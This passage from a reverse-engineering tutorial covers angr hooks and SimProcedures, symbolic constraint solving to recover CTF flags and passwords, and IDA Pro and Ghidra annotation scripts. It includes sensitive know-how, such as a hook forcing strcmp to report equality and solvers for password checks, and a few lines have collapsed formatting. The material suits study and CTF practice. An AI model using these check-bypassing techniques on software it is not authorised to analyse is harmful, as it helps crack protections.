    """Hook strcmp to always return 0 (equal)"""
    # Just return 0
    state.regs.rax = 0

# Hook with length (replace multiple instructions)
project.hook(0x401234, custom_hook, length=5)  # Hook 5 bytes
```

### SimProcedure - Advanced Hooking

```python
import angr
from angr import SimProcedure

class CustomPrintf(SimProcedure):
    """Custom printf implementation"""
    
    def run(self, fmt, *args):
        """SimProcedure run method"""
        # Read format string
        if self.state.solver.symbolic(fmt):
            # Can't handle symbolic format string
            return 0
        
        fmt_str = self.state.mem[fmt].string.concrete.decode('utf-8')
        
        # Parse format string
        self.log(f"printf called with format: {fmt_str}")
        
        # Collect arguments
        collected_args = []
        for arg in args:
            if self.state.solver.symbolic(arg):
                collected_args.append('<symbolic>')
            else:
                collected_args.append(self.state.solver.eval(arg))
        
        self.log(f"Arguments: {collected_args}")
        
        # Return number of characters printed
        return len(fmt_str)

class CustomMalloc(SimProcedure):
    """Custom malloc with tracking"""
    
    def run(self, size):
        # Concretize size if symbolic
        if self.state.solver.symbolic(size):
            size = self.state.solver.eval(size)
        
        self.log(f"malloc({size})")
        
        # Allocate memory from heap
        addr = self.state.heap.allocate(size)
        
        # Track allocation (using custom plugin)
        if hasattr(self.state, 'heap_tracker'):
            self.state.heap_tracker.allocations[addr] = size
        
        return addr

class CustomFree(SimProcedure):
    """Custom free with tracking"""
    
    def run(self, ptr):
        if self.state.solver.symbolic(ptr):
            ptr = self.state.solver.eval(ptr)
        
        self.log(f"free(0x{ptr:x})")
        
        # Track deallocation
        if hasattr(self.state, 'heap_tracker'):
            if ptr in self.state.heap_tracker.allocations:
                del self.state.heap_tracker.allocations[ptr] else: self.log(f"Warning: Freeing untracked pointer 0x{ptr:x}")

    # No return value for free

# Hook functions with custom SimProcedures

project.hook_symbol('printf', CustomPrintf()) project.hook_symbol('malloc', CustomMalloc()) project.hook_symbol('free', CustomFree())
````

### Conditional Hooking with Breakpoints

```python
import angr

class ConditionalHook(angr.SimProcedure):
    """Hook that only executes under certain conditions"""
    
    def run(self, arg1, arg2):
        # Check condition
        if self.state.solver.is_true(arg1 > 100):
            self.log("[*] Condition met: arg1 > 100")
            
            # Modify behavior
            self.state.regs.rax = 1
            return 1
        else:
            # Let original function execute
            # Call original function by jumping to it
            original_addr = self.state.project.loader.find_symbol('original_func').rebased_addr
            self.jump(original_addr)

# Breakpoint-style hooks
def breakpoint_hook(state):
    """Inspect state at specific point"""
    print(f"[*] Breakpoint hit at {hex(state.addr)}")
    print(f"    RDI: {hex(state.solver.eval(state.regs.rdi))}")
    print(f"    RSI: {hex(state.solver.eval(state.regs.rsi))}")
    
    # Optionally add constraints
    if state.solver.eval(state.regs.rdi) == 0:
        print("[*] Forcing RDI to be non-zero")
        state.solver.add(state.regs.rdi != 0)

# Hook as breakpoint (length=0 means don't skip instruction)
project.hook(0x401234, breakpoint_hook, length=0)
````

### System Call Hooking

```python
import angr
from angr import SimProcedure

class CustomRead(SimProcedure):
    """Custom read() system call handler"""
    
    def run(self, fd, buf, count):
        # Log the read
        self.log(f"read(fd={fd}, buf=0x{self.state.solver.eval(buf):x}, count={count})")
        
        # Check if reading from stdin (fd=0)
        if self.state.solver.is_true(fd == 0):
            # Make data symbolic
            if self.state.solver.symbolic(count):
                count = self.state.solver.max(count)
            
            # Create symbolic data
            data = self.state.solver.BVS('read_data', int(count) * 8)
            
            # Add constraints (e.g., printable ASCII)
            for i in range(int(count)):
                byte = data.get_byte(i)
                self.state.solver.add(byte >= 0x20)
                self.state.solver.add(byte <= 0x7e)
            
            # Write to buffer
            self.state.memory.store(buf, data)
            
            return count
        
        # Default behavior for other file descriptors
        return 0

class CustomWrite(SimProcedure):
    """Custom write() system call handler"""
    
    def run(self, fd, buf, count):
        # Concretize count if symbolic
        if self.state.solver.symbolic(count):
            count = self.state.solver.eval(count)
        
        # Read data from buffer
        data = self.state.memory.load(buf, count)
        
        # Try to concretize and print
        if not self.state.solver.symbolic(data):
            concrete_data = self.state.solver.eval(data, cast_to=bytes)
            self.log(f"write(fd={fd}): {concrete_data}")
        else:
            self.log(f"write(fd={fd}): <symbolic data>")
        
        return count

# Hook system calls
project.hook_symbol('read', CustomRead())
project.hook_symbol('write', CustomWrite())

# For raw syscalls (when using syscall instruction)
class SyscallHook(SimProcedure):
    def run(self):
        # Get syscall number from RAX
        syscall_num = self.state.solver.eval(self.state.regs.rax)
        
        if syscall_num == 0:  # read
            return CustomRead().execute(self.state)
        elif syscall_num == 1:  # write
            return CustomWrite().execute(self.state)
        else:
            self.log(f"Unhandled syscall: {syscall_num}")
            return 0

# Hook syscall instruction
project.hook(0x401234, SyscallHook(), length=2)  # syscall is 2 bytes
```

### Logging and Debugging Hooks

```python
import angr
from angr import SimProcedure

class FunctionTracer(SimProcedure):
    """Trace function calls with arguments"""
    
    call_depth = 0  # Track call depth for indentation
    
    def run(self):
        # Get function information
        func_addr = self.state.addr
        func_name = self.state.project.loader.find_symbol(func_addr)
        func_name = func_name.name if func_name else f"sub_{func_addr:x}"
        
        # Log entry
        indent = "  " * self.call_depth
        self.log(f"{indent}-> {func_name}()")
        
        # Read arguments (x86-64)
        args_regs = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9']
        args = []
        for reg in args_regs:
            value = getattr(self.state.regs, reg)
            if self.state.solver.symbolic(value):
                args.append('<symbolic>')
            else:
                args.append(hex(self.state.solver.eval(value)))
        
        self.log(f"{indent}   Args: {', '.join(args[:3])}")  # First 3 args
        
        # Increase depth
        FunctionTracer.call_depth += 1
        
        # Execute original function (simplified - actual implementation varies)
        # For demonstration, we'll just return
        FunctionTracer.call_depth -= 1
        
        self.log(f"{indent}<- {func_name} returns")

# Hook multiple functions for tracing
functions_to_trace = ['func1', 'func2', 'dangerous_func']
for func_name in functions_to_trace:
    try:
        project.hook_symbol(func_name, FunctionTracer())
    except:
        print(f"Could not hook {func_name}")
```

### Memory Access Hooks

```python
import angr

def memory_read_hook(state):
    """Hook to monitor memory reads"""
    # Get read address and size from state inspection
    if hasattr(state, 'inspect'):
        addr = state.inspect.mem_read_address
        size = state.inspect.mem_read_length
        
        if state.solver.symbolic(addr):
            print(f"[*] Symbolic memory read: size={size}")
        else:
            concrete_addr = state.solver.eval(addr)
            print(f"[*] Memory read at 0x{concrete_addr:x}, size={size}")
            
            # Check for out-of-bounds reads
            if concrete_addr < 0x1000:
                print(f"[!] Warning: Low memory read at 0x{concrete_addr:x}")

def memory_write_hook(state):
    """Hook to monitor memory writes"""
    if hasattr(state, 'inspect'):
        addr = state.inspect.mem_write_address
        expr = state.inspect.mem_write_expr
        size = state.inspect.mem_write_length
        
        if not state.solver.symbolic(addr):
            concrete_addr = state.solver.eval(addr)
            
            # Check for writes to sensitive areas
            if 0x400000 <= concrete_addr < 0x500000:  # Text section
                print(f"[!] Warning: Write to code section at 0x{concrete_addr:x}")
            
            # Log symbolic writes
            if state.solver.symbolic(expr):
                print(f"[*] Symbolic write at 0x{concrete_addr:x}, size={size}")

# Set up inspection breakpoints
state = project.factory.entry_state()
state.inspect.b('mem_read', when=angr.BP_AFTER, action=memory_read_hook)
state.inspect.b('mem_write', when=angr.BP_BEFORE, action=memory_write_hook)
```

### Hook Library Functions for Analysis

```python
#!/usr/bin/env python3
import angr
from angr import SimProcedure

class LibraryHookSuite:
    """Collection of hooks for common library functions"""
    
    class StrcmpHook(SimProcedure):
        """strcmp that tracks comparison"""
        
        def run(self, s1, s2):
            # Read strings
            str1 = self.state.mem[s1].string.resolved
            str2 = self.state.mem[s2].string.resolved
            
            # If one is symbolic, constrain them to be equal
            if self.state.solver.symbolic(str1) or self.state.solver.symbolic(str2):
                self.log("[*] strcmp with symbolic argument - forcing equal")
                self.state.solver.add(str1 == str2)
                return 0
            
            # Both concrete - normal comparison
            if self.state.solver.eval(str1) == self.state.solver.eval(str2):
                return 0
            else:
                return 1
    
    class StrlenHook(SimProcedure):
        """strlen with length tracking"""
        
        def run(self, s):
            # Read string
            string = self.state.mem[s].string.resolved
            
            if self.state.solver.symbolic(string):
                # Create symbolic length
                length = self.state.solver.BVS('strlen_result', 64)
                self.state.solver.add(length >= 0)
                self.state.solver.add(length <= 1024)  # Reasonable max
                return length
            
            # Concrete string
            concrete_str = self.state.solver.eval(string, cast_to=bytes)
            return len(concrete_str)
    
    class RandomHook(SimProcedure):
        """Make random() return controllable values"""
        
        def run(self):
            # Return symbolic value
            random_val = self.state.solver.BVS('random_value', 32)
            self.log("[*] random() returning symbolic value")
            return random_val
    
    class GetenvHook(SimProcedure):
        """Hook getenv to return symbolic environment variables"""
        
        def run(self, name):
            # Read variable name
            name_str = self.state.mem[name].string.resolved
            
            if not self.state.solver.symbolic(name_str):
                name_concrete = self.state.solver.eval(name_str, cast_to=bytes)
                self.log(f"[*] getenv({name_concrete.decode()})")
                
                # Return symbolic value for interesting vars
                if b'FLAG' in name_concrete or b'PASSWORD' in name_concrete:
                    # Allocate memory for symbolic result
                    result_addr = self.state.heap.allocate(32)
                    symbolic_val = self.state.solver.BVS('env_value', 32 * 8)
                    self.state.memory.store(result_addr, symbolic_val)
                    return result_addr
            
            # Return NULL for other cases
            return 0
    
    @staticmethod
    def apply_hooks(project):
        """Apply all hooks to project"""
        project.hook_symbol('strcmp', LibraryHookSuite.StrcmpHook())
        project.hook_symbol('strncmp', LibraryHookSuite.StrcmpHook())
        project.hook_symbol('strlen', LibraryHookSuite.StrlenHook())
        project.hook_symbol('random', LibraryHookSuite.RandomHook())
        project.hook_symbol('rand', LibraryHookSuite.RandomHook())
        project.hook_symbol('getenv', LibraryHookSuite.GetenvHook())

# Usage
project = angr.Project('./binary')
LibraryHookSuite.apply_hooks(project)
```

---

## Constraint Solving

Constraint solving is central to symbolic execution, determining which inputs satisfy path conditions.

### Basic Constraint Operations

```python
import angr
import claripy

project = angr.Project('./binary')
state = project.factory.entry_state()

# Create symbolic variables
x = claripy.BVS('x', 32)
y = claripy.BVS('y', 32)

# Add constraints
state.solver.add(x > 10)
state.solver.add(x < 100)
state.solver.add(y == x * 2)

# Check satisfiability
if state.solver.satisfiable():
    print("Constraints are satisfiable")
    
    # Get a solution
    x_val = state.solver.eval(x)
    y_val = state.solver.eval(y)
    print(f"x = {x_val}, y = {y_val}")
else:
    print("Constraints are unsatisfiable")

# Get multiple solutions
solutions = state.solver.eval_upto(x, 5)  # Up to 5 solutions
print(f"Possible x values: {solutions}")

# Get min/max
min_x = state.solver.min(x)
max_x = state.solver.max(x)
print(f"x range: [{min_x}, {max_x}]")

# Check if value is unique
if state.solver.unique(x):
    print(f"x has unique solution: {state.solver.eval(x)}")
```

### Advanced Constraint Techniques

```python
import claripy

# Conditional constraints
condition = x > 50
state.solver.add(claripy.If(condition, y == 100, y == 200))

# String constraints
string_var = claripy.BVS('input_string', 8 * 32)

# Constrain to printable ASCII
for i in range(32):
    byte = string_var.get_byte(i)
    state.solver.add(byte >= 0x20)
    state.solver.add(byte <= 0x7e)

# Pattern matching constraints
# String must contain "flag"
flag_pattern = claripy.BVV(b'flag')
# [Inference] Check if substring exists
contains_flag = claripy.Or(*[
    string_var.get_bytes(i, 4) == flag_pattern
    for i in range(28)  # 32 - 4
])
state.solver.add(contains_flag)

# Complex arithmetic constraints
z = claripy.BVS('z', 32)
state.solver.add((x * y + z) == 12345)
state.solver.add((x ^ y) == z)

# Array constraints
arr = [claripy.BVS(f'arr_{i}', 8) for i in range(10)]
# First element is 'A'
state.solver.add(arr[0] == ord('A'))
# Sorted order
for i in range(9):
    state.solver.add(arr[i] <= arr[i+1])
```

### Constraint Optimization

```python
#!/usr/bin/env python3
import angr
import claripy

class ConstraintOptimizer:
    """Optimize constraints for faster solving"""
    
    def __init__(self, state):
        self.state = state
    
    def simplify_constraints(self):
        """Simplify constraint set"""
        # Get current constraints
        constraints = self.state.solver.constraints
        
        print(f"[*] Original constraints: {len(constraints)}")
        
        # Simplify each constraint
        simplified = []
        for c in constraints:
            simp = claripy.simplify(c)
            simplified.append(simp)
        
        # Replace constraints
        self.state.solver._solver.constraints = simplified
        
        print(f"[*] After simplification: {len(simplified)}")
    
    def remove_redundant_constraints(self):
        """[Inference] Remove constraints that don't affect satisfiability"""
        constraints = list(self.state.solver.constraints)
        essential = []
        
        for i, constraint in enumerate(constraints):
            # Temporarily remove constraint
            temp_constraints = constraints[:i] + constraints[i+1:]
            
            # Create temporary solver
            temp_solver = self.state.solver._solver.blank_copy()
            for c in temp_constraints:
                temp_solver.add(c)
            
            # Check if still satisfiable with same solution space
            if not temp_solver.satisfiable():
                # Constraint is essential
                essential.append(constraint)
        
        print(f"[*] Reduced from {len(constraints)} to {len(essential)} constraints")
        return essential
    
    def concretize_early(self, variable, strategy='min'):
        """Concretize variable early to reduce constraint complexity"""
        if strategy == 'min':
            value = self.state.solver.min(variable)
        elif strategy == 'max':
            value = self.state.solver.max(variable)
        elif strategy == 'any':
            value = self.state.solver.eval(variable)
        else:
            raise ValueError("Invalid strategy")
        
        # Add constraint fixing this value
        self.state.solver.add(variable == value)
        
        return value

# Usage
optimizer = ConstraintOptimizer(state)
optimizer.simplify_constraints()

# Concretize less important variables early
unimportant_var = state.regs.r15
optimizer.concretize_early(unimportant_var, strategy='any')
```

### Incremental Solving

```python
#!/usr/bin/env python3
import angr
import claripy

def incremental_solving_example():
    """Demonstrate incremental constraint solving"""
    project = angr.Project('./binary')
    state = project.factory.entry_state()
    
    # Create symbolic input
    password = claripy.BVS('password', 8 * 16)
    
    # Add constraints incrementally
    constraints = []
    
    # Character 0 must be 'F'
    constraints.append(password.get_byte(0) == ord('F'))
    state.solver.add(constraints[-1])
    
    # Check satisfiability after each constraint
    for i, char in enumerate('FLAG{'):
        constraint = password.get_byte(i) == ord(char)
        constraints.append(constraint)
        
        # Add and check
        state.solver.add(constraint)
        
        if not state.solver.satisfiable():
            print(f"[!] Unsatisfiable after character {i}")
            return None
        
        print(f"[+] Character {i} constrained, still satisfiable")
    
    # Get solution
    solution = state.solver.eval(password, cast_to=bytes)
    return solution
```

### Solver Backends and Configuration

```python
import angr
import claripy

# Configure solver backend
# Default is Z3, but can use other backends

# Create state with specific solver
state = project.factory.entry_state()

# Solver timeout
state.solver._solver.timeout = 5000  # 5 seconds

# Create solver with specific backend [Inference]
from claripy.backends import BackendZ3
backend = BackendZ3()

# Solver strategies
state.options.add(angr.options.LAZY_SOLVES)  # Delay solving
state.options.add(angr.options.SIMPLIFY_CONSTRAINTS)

# Approximate solving for performance [Unverified]
# Uses approximations to speed up solving at cost of precision
state.options.add(angr.options.APPROXIMATE_GUARDS)
state.options.add(angr.options.APPROXIMATE_SATISFIABILITY)
```

### Constraint Debugging

```python
#!/usr/bin/env python3
import angr
import claripy

class ConstraintDebugger:
    """Debug constraint solving issues"""
    
    def __init__(self, state):
        self.state = state
    
    def analyze_constraints(self):
        """Analyze constraint set"""
        constraints = self.state.solver.constraints
        
        print(f"Total constraints: {len(constraints)}")
        
        # Categorize constraints
        variable_counts = {}
        for constraint in constraints:
            vars_in_constraint = constraint.variables
            for var in vars_in_constraint:
                variable_counts[var] = variable_counts.get(var, 0) + 1
        
        print("\nVariables in constraints:")
        for var, count in sorted(variable_counts.items(), key=lambda x: x[1], reverse=True):
            print(f"  {var}: {count} constraints")
        
        # Check for contradictions
        self.find_contradictions()
    
    def find_contradictions(self):
        """Find contradictory constraints"""
        constraints = list(self.state.solver.constraints)
        
        print("\nChecking for contradictions...")
        
        for i, c1 in enumerate(constraints):
            for c2 in constraints[i+1:]:
                # Check if c1 and c2 together are unsatisfiable
                temp_solver = claripy.Solver()
                temp_solver.add(c1)
                temp_solver.add(c2)
                
                if not temp_solver.satisfiable():
                    print(f"[!] Contradiction found:")
                    print(f"    Constraint 1: {c1}")
                    print(f"    Constraint 2: {c2}")
    
    def dump_constraints(self, filename='constraints.txt'):
        """Dump constraints to file for analysis"""
        with open(filename, 'w') as f:
            for i, constraint in enumerate(self.state.solver.constraints):
                f.write(f"Constraint {i}:\n")
                f.write(f"  {constraint}\n")
                f.write(f"  Variables: {constraint.variables}\n\n")
        
        print(f"[*] Constraints dumped to {filename}")

# Usage
debugger = ConstraintDebugger(state)
debugger.analyze_constraints()
debugger.dump_constraints()
```

### Complete Constraint Solving Example

```python
#!/usr/bin/env python3
import angr
import claripy
import sys

def solve_complex_constraints(binary_path):
    """Comprehensive constraint solving example"""
    project = angr.Project(binary_path, auto_load_libs=False)
    
    # Create symbolic input
    flag_length = 32
    flag = claripy.BVS('flag', flag_length * 8)
    
    state = project.factory.entry_state(stdin=flag)
    
    # Add input constraints
    # Must be printable ASCII
    for i in range(flag_length):
        byte = flag.get_byte(i)
        state.solver.add(byte >= 0x20)
        state.solver.add(byte <= 0x7e)
    
    # Must start with "CTF{"
    for i, char in enumerate(b'CTF{'):
        state.solver.add(flag.get_byte(i) == char)
    
    # Must end with "}"
    state.solver.add(flag.get_byte(flag_length - 1) == ord('}'))
    
    # Create simulation manager
    simgr = project.factory.simulation_manager(state)
    
    # Define success condition
    def is_success(state):
        output = state.posix.dumps(1)
        return b'Correct' in output or b'Success' in output
    
    def is_failure(state):
        output = state.posix.dumps(1)
        return b'Wrong' in output or b'Failure' in output
    
    # Explore with constraint collection
    print("[*] Exploring...")
    simgr.explore(find=is_success, avoid=is_failure)
    
    # Extract solution
    if simgr.found:
        found_state = simgr.found[0]
        
        print(f"[+] Solution found!")
        print(f"[*] Constraints in final state: {len(found_state.solver.constraints)}")
        
        # Solve for flag
        flag_solution = found_state.solver.eval(flag, cast_to=bytes)
        print(f"[+] Flag: {flag_solution.decode()}")
        
        # Verify uniqueness
        if found_state.solver.unique(flag):
            print("[+] Solution is unique")
        else:
            alt_solutions = found_state.solver.eval_upto(flag, 5, cast_to=bytes)
            print(f"[*] Found {len(alt_solutions)} alternative solutions:")
            for sol in alt_solutions:
                print(f"    {sol.decode()}")
        
        return flag_solution
    else:
        print("[-] No solution found")
        
        # Debug why no solution
        if simgr.deadended:
            print(f"[*] {len(simgr.deadended)} paths deadended")
        if simgr.errored:
            print(f"[!] {len(simgr.errored)} paths errored:")
            for errored in simgr.errored:
                print(f"    {errored.error}")
        
        return None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary>")
        sys.exit(1)
    
    solve_complex_constraints(sys.argv[1])
```

**Important Related Topics:**

- **SMT solver backends** - Z3, CVC4, Boolector comparison and selection
- **Concolic execution** - Combining concrete and symbolic execution
- **Path prioritization** - Heuristics for exploring promising paths first
- **State explosion mitigation** - Techniques to handle exponential path growth
- **Symbolic memory models** - Handling symbolic pointers and array accesses

---

# Documentation & Reporting

## Annotating Disassembly

### Fundamentals

Effective annotation transforms raw disassembly into comprehensible documentation. Proper annotations accelerate analysis, enable collaboration, and preserve insights for future reference.

**Annotation Priorities:**

1. Function purposes and behavior
2. Variable types and meanings
3. Control flow logic
4. Interesting addresses (vulnerabilities, targets)
5. Cross-references and relationships
6. Assumptions and uncertainties

### IDA Pro Annotation Techniques

**Basic Annotations:**

```python
# IDA Python script for annotation
import ida_name
import ida_bytes
import idc
import idaapi

# Rename function
ida_name.set_name(0x401000, "validate_license", ida_name.SN_CHECK)

# Add comment
idc.set_cmt(0x401000, "Validates license key format and checksum", 0)

# Add repeatable comment (visible at all xrefs)
idc.set_cmt(0x401000, "Main validation routine", 1)

# Set function comment
idc.set_func_cmt(0x401000, "Returns 1 if valid, 0 if invalid", 0)

# Rename local variable
ida_frame.set_member_name(frame, offset, "license_buffer")

# Set operand type
idc.op_plain_offset(0x401010, 0, 0x600000)  # Mark as offset to data

# Add enum member comment
ida_enum.set_enum_member_cmt(enum_id, value, "Success code", 0)
```

**Advanced Variable Annotation:**

```python
# IDA Python: Annotate stack variables with types
import ida_typeinf
import ida_struct

def annotate_stack_variable(func_ea, offset, var_name, type_str):
    """
    Annotate stack variable with name and type
    
    func_ea: Function address
    offset: Stack offset (negative for local vars)
    var_name: Variable name
    type_str: Type string (e.g., "char *", "int", "struct user_data *")
    """
    # Get function frame
    frame = ida_frame.get_frame(func_ea)
    if not frame:
        print(f"No frame for function at {hex(func_ea)}")
        return False
    
    # Set member name
    member = ida_struct.get_member(frame, offset)
    if member:
        ida_struct.set_member_name(frame, offset, var_name)
        
        # Parse and apply type
        tinfo = ida_typeinf.tinfo_t()
        if ida_typeinf.parse_decl(tinfo, None, type_str + ";", 0):
            ida_struct.set_member_tinfo(frame, member, 0, tinfo, 0)
            print(f"Annotated {var_name} at {hex(func_ea)}+{offset}")
            return True
    
    return False

# Usage
annotate_stack_variable(0x401000, -0x20, "input_buffer", "char [32]")
annotate_stack_variable(0x401000, -0x50, "user_data", "struct credentials *")
```

**Structure and Type Definitions:**

```python
# Create custom structures for annotation
import ida_struct
import ida_typeinf

def create_custom_struct(struct_name, members):
    """
    Create custom structure for better annotation
    
    members: List of tuples (name, type, size)
    Example: [("magic", "uint32_t", 4), ("length", "uint16_t", 2)]
    """
    # Create structure
    sid = ida_struct.add_struc(idaapi.BADADDR, struct_name, 0)
    if sid == idaapi.BADADDR:
        print(f"Failed to create struct {struct_name}")
        return None
    
    sptr = ida_struct.get_struc(sid)
    offset = 0
    
    for name, type_str, size in members:
        # Parse type
        tinfo = ida_typeinf.tinfo_t()
        if ida_typeinf.parse_decl(tinfo, None, f"{type_str} {name};", 0):
            ida_struct.add_struc_member(sptr, name, offset, 
                                        ida_bytes.get_flags_by_size(size),
                                        None, size)
            
            # Set member type
            member = ida_struct.get_member(sptr, offset)
            ida_struct.set_member_tinfo(sptr, member, 0, tinfo, 0)
            
            offset += size
    
    print(f"Created struct {struct_name} ({offset} bytes)")
    return sid

# Define protocol message structure
protocol_msg_struct = create_custom_struct("protocol_message", [
    ("magic", "uint32_t", 4),
    ("msg_type", "uint8_t", 1),
    ("flags", "uint8_t", 1),
    ("length", "uint16_t", 2),
    ("payload", "uint8_t[256]", 256)
])

# Apply structure to data
idc.create_struct(0x601000, protocol_msg_struct)
```

**Cross-Reference Annotations:**

```python
# Add cross-reference comments automatically
import idautils

def annotate_all_calls_to(func_ea, comment):
    """Add comment at all locations calling specified function"""
    func_name = ida_name.get_name(func_ea)
    
    for xref in idautils.XrefsTo(func_ea):
        if xref.type in [idaapi.fl_CN, idaapi.fl_CF]:  # Call xrefs
            caller_ea = xref.frm
            existing_cmt = idc.get_cmt(caller_ea, 0) or ""
            
            new_comment = f"{existing_cmt}\n{comment}".strip()
            idc.set_cmt(caller_ea, new_comment, 0)
            
            print(f"Annotated call at {hex(caller_ea)}")

# Usage: Mark all dangerous function calls
annotate_all_calls_to(0x401500, "⚠️ Unsafe: strcpy without bounds check")
annotate_all_calls_to(0x401600, "🔐 Cryptographic validation")
```

**Color Coding for Visual Organization:**

```python
# Color code different types of functions/data
import idc

# Color definitions
COLOR_VULNERABLE = 0x4040FF    # Red
COLOR_CRYPTO = 0x40FF40        # Green
COLOR_INPUT = 0xFF4040         # Blue
COLOR_OUTPUT = 0x40FFFF        # Yellow
COLOR_INTERESTING = 0xFF40FF   # Purple

def colorize_function(func_ea, color):
    """Apply color to entire function"""
    func = idaapi.get_func(func_ea)
    if func:
        for ea in range(func.start_ea, func.end_ea):
            idc.set_color(ea, idc.CIC_ITEM, color)

# Mark vulnerable functions
colorize_function(0x401000, COLOR_VULNERABLE)

# Mark crypto functions
colorize_function(0x402000, COLOR_CRYPTO)

# Mark input handling
colorize_function(0x403000, COLOR_INPUT)
```

**Automated Annotation Scripts:**

```python
#!/usr/bin/env python3
"""
IDA Python: Automated annotation script
Run after initial auto-analysis
"""

import ida_bytes
import ida_name
import idc
import idautils

class AutoAnnotator:
    """Automatically annotate common patterns"""
    
    def __init__(self):
        self.dangerous_funcs = {
            'strcpy': '⚠️ Buffer overflow risk',
            'sprintf': '⚠️ Format string + overflow risk',
            'gets': '⚠️ Unbounded read',
            'scanf': '⚠️ Format string risk',
            'strcat': '⚠️ Buffer overflow risk',
        }
        
        self.crypto_funcs = {
            'MD5': '🔐 Cryptographic hash',
            'SHA256': '🔐 Cryptographic hash',
            'AES': '🔐 Encryption',
            'RSA': '🔐 Asymmetric crypto',
        }
    
    def annotate_imports(self):
        """Annotate imported functions"""
        import_count = 0
        
        for ea in idautils.Entries():
            name = ida_name.get_name(ea[1])
            
            # Check dangerous functions
            for func, comment in self.dangerous_funcs.items():
                if func.lower() in name.lower():
                    idc.set_cmt(ea[1], comment, 1)
                    colorize_function(ea[1], COLOR_VULNERABLE)
                    import_count += 1
            
            # Check crypto functions
            for func, comment in self.crypto_funcs.items():
                if func.lower() in name.lower():
                    idc.set_cmt(ea[1], comment, 1)
                    colorize_function(ea[1], COLOR_CRYPTO)
                    import_count += 1
        
        print(f"Annotated {import_count} imported functions")
    
    def annotate_strings(self):
        """Annotate interesting strings and their xrefs"""
        interesting_patterns = [
            ('flag', 'FLAG reference'),
            ('password', 'PASSWORD reference'),
            ('key', 'KEY reference'),
            ('secret', 'SECRET reference'),
            ('admin', 'ADMIN reference'),
            ('debug', 'DEBUG mode reference'),
        ]
        
        string_count = 0
        
        for string_ea in idautils.Strings():
            string_val = str(string_ea).lower()
            
            for pattern, comment in interesting_patterns:
                if pattern in string_val:
                    # Annotate string location
                    idc.set_cmt(string_ea.ea, comment, 0)
                    
                    # Annotate all references
                    for xref in idautils.XrefsTo(string_ea.ea):
                        idc.set_cmt(xref.frm, f"Uses: {comment}", 0)
                        idc.set_color(xref.frm, idc.CIC_ITEM, COLOR_INTERESTING)
                        string_count += 1
        
        print(f"Annotated {string_count} string references")
    
    def annotate_syscalls(self):
        """Annotate system calls"""
        syscall_count = 0
        
        for func_ea in idautils.Functions():
            func = idaapi.get_func(func_ea)
            if not func:
                continue
            
            for ea in range(func.start_ea, func.end_ea):
                # Look for syscall instruction
                mnem = idc.print_insn_mnem(ea)
                if mnem in ['syscall', 'int 0x80', 'sysenter']:
                    # Get syscall number (typically in rax/eax)
                    prev_ea = idc.prev_head(ea)
                    if idc.print_insn_mnem(prev_ea) == 'mov':
                        # Try to extract syscall number
                        op_val = idc.get_operand_value(prev_ea, 1)
                        syscall_name = get_syscall_name(op_val)
                        
                        comment = f"SYSCALL: {syscall_name} ({op_val})"
                        idc.set_cmt(ea, comment, 0)
                        syscall_count += 1
        
        print(f"Annotated {syscall_count} syscalls")
    
    def run_all(self):
        """Run all annotation passes"""
        print("Starting auto-annotation...")
        self.annotate_imports()
        self.annotate_strings()
        self.annotate_syscalls()
        print("Auto-annotation complete")

# Run annotator
annotator = AutoAnnotator()
annotator.run_all()
```

### Ghidra Annotation Techniques

**Basic Ghidra Annotations:**

```python
# Ghidra Python script
from ghidra.program.model.symbol import SourceType

# Get current program
program = currentProgram
listing = program.getListing()
symbolTable = program.getSymbolTable()
functionManager = program.getFunctionManager()

# Rename function
func = functionManager.getFunctionAt(toAddr(0x401000))
if func:
    func.setName("validate_license", SourceType.USER_DEFINED)

# Add plate comment (visible at function start)
listing.setComment(toAddr(0x401000), listing.PLATE_COMMENT,
                   "License Validation Function\n" +
                   "Args: char *license\n" +
                   "Returns: int (1=valid, 0=invalid)")

# Add EOL comment (end of line)
listing.setComment(toAddr(0x401010), listing.EOL_COMMENT,
                   "Check magic bytes")

# Add pre-comment (above instruction)
listing.setComment(toAddr(0x401020), listing.PRE_COMMENT,
                   "Main validation loop")

# Add post-comment (below instruction)
listing.setComment(toAddr(0x401030), listing.POST_COMMENT,
                   "Cleanup and return")
```

**Ghidra Structure Definition:**

```python
# Create custom data types in Ghidra
from ghidra.program.model.data import StructureDataType, IntegerDataType, ArrayDataType

dtm = program.getDataTypeManager()
transaction = program.startTransaction("Create Structures")

try:
    # Create structure
    struct = StructureDataType("protocol_message", 0)
    
    # Add members
    struct.add(IntegerDataType.dataType, 4, "magic", "Protocol magic number")
    struct.add(IntegerDataType.dataType.getUnsignedDataType(1), 1, "msg_type", None)
    struct.add(IntegerDataType.dataType.getUnsignedDataType(1), 1, "flags", None)
    struct.add(IntegerDataType.dataType.getUnsignedDataType(2), 2, "length", None)
    
    payload_array = ArrayDataType(IntegerDataType.dataType.getUnsignedDataType(1), 256, 1)
    struct.add(payload_array, "payload", None)
    
    # Add to data type manager
    dtm.addDataType(struct, None)
    
    # Apply structure to address
    listing.createData(toAddr(0x601000), struct)
    
    program.endTransaction(transaction, True)
    print("Structure created and applied")

except Exception as e:
    program.endTransaction(transaction, False)
    print(f"Error: {e}")
```

**Ghidra Automated Annotation Script:**

```python
#!/usr/bin/env python
# Ghidra automated annotation
from ghidra.program.model.symbol import SourceType, RefType
from ghidra.program.model.listing import CodeUnit

def annotate_dangerous_calls():
    """Mark dangerous function calls"""
    dangerous_funcs = {
        'strcpy': 'DANGEROUS: No bounds checking',
        'sprintf': 'DANGEROUS: Format string + buffer overflow',
        'gets': 'DANGEROUS: Unbounded input',
    }
    
    for func_name, warning in dangerous_funcs.items():
        # Find function
        symbols = symbolTable.getSymbols(func_name)
        for symbol in symbols:
            func_addr = symbol.getAddress()
            
            # Find all references to this function
            refs = getReferencesTo(func_addr)
            for ref in refs:
                if ref.getReferenceType() == RefType.UNCONDITIONAL_CALL:
                    call_addr = ref.getFromAddress()
                    
                    # Add warning comment
                    existing = listing.getComment(CodeUnit.EOL_COMMENT, call_addr)
                    new_comment = f"⚠️ {warning}"
                    if existing:
                        new_comment = f"{existing} | {new_comment}"
                    
                    listing.setComment(call_addr, CodeUnit.EOL_COMMENT, new_comment)
                    
                    # Set background color (red)
                    setBackgroundColor(call_addr, java.awt.Color.RED)
    
    print("Dangerous calls annotated")

def annotate_interesting_strings():
    """Annotate references to interesting strings"""
    patterns = ['flag', 'password', 'key', 'secret', 'admin']
    
    # Iterate through defined strings
    for string_addr in currentProgram.getListing().getDefinedData(True):
        if string_addr.hasStringValue():
